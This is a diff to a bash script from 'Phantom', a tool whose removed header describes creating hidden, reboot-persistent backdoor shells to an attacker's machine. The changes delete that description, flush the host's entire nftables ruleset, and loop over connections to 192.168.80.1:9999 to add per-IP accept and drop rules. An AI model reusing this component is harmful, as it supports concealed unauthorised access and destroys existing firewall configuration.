@@ -1,8 +1,6 @@
 #!/bin/bash
 
-: 'Phantom is a tool which creates backdoor shells from a target machine to a predifined ip:port (your machine) and hides their pid, persisting through reboots.
-It also hides the files needed to perform the above.
-
+: '
 Copyright © 2018 Konstantinos Sarantopoulos
 
 Permission is hereby granted, free of charge, to any person obtaining a copy
@@ -24,36 +22,57 @@ OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 SOFTWARE.
 '
 
-#change the ip and port in the connection_ip and connection_port according to the ip of the listening ncat port
+#if there is a reverse argument undo changes to the nft ruleset
+for i in "$@"; do
+	if [ "$i" == "-R" ] || [ "$i" == "-r" ]; then
+		if [ -e "/etc/nftables.conf.bak" ]; then
+			mv /etc/nftables.conf.bak /etc/nftables.conf
+		fi
+		systemctl restart nftables
+		if [ "$?" == "0" ]; then
+			echo "undid firewall changes"
+		else
+			echo "failed to undo firewall changes"
+		fi
+		exit
+	fi
+done
 
-nft flush table PHANTOM
+#make a backup of nftables rules, flush ruleset and restart nftables
+if [ ! -e "/etc/nftables.conf.bak" ]; then
+	cp /etc/nftables.conf /etc/nftables.conf.bak
+	echo "made a backup of /etc/nftables.conf to /etc/nftables.conf.bak"
+fi
+
+nft flush ruleset
 nft add table ip PHANTOM
 nft add chain PHANTOM INPUT { type filter hook input priority -- -333 \; }
 nft list ruleset >/etc/nftables.conf
 
 while true; do
 
-connection_ip=$(netstat -tpn 2>/dev/null | awk '{ if($4 ~ /127.0.0.1:9999/) print }' |  awk '{ if($6 ~ /ESTABLISHED/) print }' |\
+connection_ip=$(netstat -tpn 2>/dev/null | awk '{ if($4 ~ /192.168.80.1:9999/) print }' |\
 awk '{ print $5 }' | awk -F: '{ print $1 }')
 read -d z -a ip <<< "$connection_ip"
-connection_port=$(netstat -tpn 2>/dev/null | awk '{ if($4 ~ /127.0.0.1:9999/) print }' |  awk '{ if($6 ~ /ESTABLISHED/) print }' |\
+connection_port=$(netstat -tpn 2>/dev/null | awk '{ if($4 ~ /192.168.80.1:9999/) print }' |\
 awk '{ print $5 }' | awk -F: '{ print $2 }')
 read -d z -a port <<< "$connection_port"
 if [ "${ip[0]}" != "" ]; then
 	for (( i=0; i < ${#ip[@]}; i=i+1 )); do
-		count=0	
+		count=0
+		echo "${ip[i]}"
 		while read nft; do
 			if [ "$nft" == "ip saddr ${ip[i]} drop" ]; then
-				echo "rule ${ip[i]} drop already exists"
+				#echo "rule ${ip[i]} drop already exists"
 				count=1
 			fi
 		done < /etc/nftables.conf
-		if [ "$count" != "1" ]; then				
+		if [ "$count" != "1" ]; then
 			echo "allowing ${ip[i]}:${port[i]}"
 			nft add rule ip PHANTOM INPUT ip saddr ${ip[i]} tcp sport ${port[i]} accept
 			nft add rule ip PHANTOM INPUT ip saddr ${ip[i]} drop
 			nft list ruleset > /etc/nftables.conf
-		fi	
+		fi
 	done
 fi
 sleep 20
